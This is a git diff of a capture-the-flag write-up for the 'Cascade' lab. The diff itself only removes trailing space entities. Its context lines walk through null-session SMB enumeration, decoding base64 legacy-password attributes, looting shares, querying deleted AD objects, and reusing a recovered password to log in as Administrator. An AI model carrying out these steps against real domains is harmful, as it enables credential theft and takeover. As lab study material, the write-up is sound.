@@ -1,6 +1,6 @@
 # Cascade
 
-## Gaining Access&#x20;
+## Gaining Access
 
 Nmap scan:
 
@@ -30,7 +30,7 @@ PORT      STATE SERVICE
 
 ### SMB Null Shares
 
-SMB enumeration gave me a load of usernames.&#x20;
+SMB enumeration gave me a load of usernames.
 
 ```
 $ enum4linux -u '' -p '' -a 10.129.178.248
@@ -73,7 +73,7 @@ msDS-SupportedEncryptionTypes: 0
 cascadeLegacyPwd: clk0bjVldmE=
 ```
 
-There was a `cascadceLegacyPwd` field, which is normally not present. Decoded, this gives `rY4n5eva`. Using these credentials, we can gain access to the SMB shares, but no shell yet.&#x20;
+There was a `cascadceLegacyPwd` field, which is normally not present. Decoded, this gives `rY4n5eva`. Using these credentials, we can gain access to the SMB shares, but no shell yet.
 
 ```
 $ smbmap -H 10.129.178.248 -u r.thompson -p rY4n5eva                          
@@ -112,7 +112,7 @@ getting file \IT\Logs\DCs\dcdiag.log of size 5967 as IT/Logs/DCs/dcdiag.log (153
 getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as IT/Temp/s.smith/VNC Install.reg (81.8 KiloBytes/sec) (average 83.4 KiloBytes/sec)
 ```
 
-The Printer share had a bunch of DLLs and other printer-related files like images, which was not interesting. Out of all files downloaded, the VNC Install one was the most interesting. VNC is sort of like RDP, so there might be credentials there.&#x20;
+The Printer share had a bunch of DLLs and other printer-related files like images, which was not interesting. Out of all files downloaded, the VNC Install one was the most interesting. VNC is sort of like RDP, so there might be credentials there.
 
 ```
 $ cat VNC\ Install.reg   
@@ -207,7 +207,7 @@ Global Group memberships     *Domain Users
 The command completed successfully.
 ```
 
-Audit Share is rather interesting. We can take another look at the SMB shares I have available to `s.smith`.&#x20;
+Audit Share is rather interesting. We can take another look at the SMB shares I have available to `s.smith`.
 
 ```
 $ smbmap -H 10.129.178.248 -u s.smith -p sT333ve2   
@@ -250,7 +250,7 @@ smb: \DB\> ls
   Audit.db                           An    24576  Tue Jan 28 16:39:24 2020
 ```
 
-`Audit.db` was an SQLite database file, which we can open using `sqlite3`.&#x20;
+`Audit.db` was an SQLite database file, which we can open using `sqlite3`.
 
 ```
 $ sqlite3 -readonly Audit.db 
@@ -352,7 +352,7 @@ This means we can restore and view deleted items. We can run this one-liner:
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
 
-Within the output, we would see another `CascadeLegacyPw` field.&#x20;
+Within the output, we would see another `CascadeLegacyPw` field.
 
 ```
 CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
@@ -360,7 +360,7 @@ CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
 cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
 ```
 
-This decodes to give `baCT3r1aN00dles`, and I noticed this was for a user called `TempAdmin`. By testing password reuse, we find that we can login as the Administrator using this password.&#x20;
+This decodes to give `baCT3r1aN00dles`, and I noticed this was for a user called `TempAdmin`. By testing password reuse, we find that we can login as the Administrator using this password.
 
 <figure><img src="../../../.gitbook/assets/image (3687).png" alt=""><figcaption></figcaption></figure>
 
